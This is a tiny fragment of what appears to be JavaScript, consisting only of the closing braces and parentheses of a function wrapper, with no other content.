});
})();
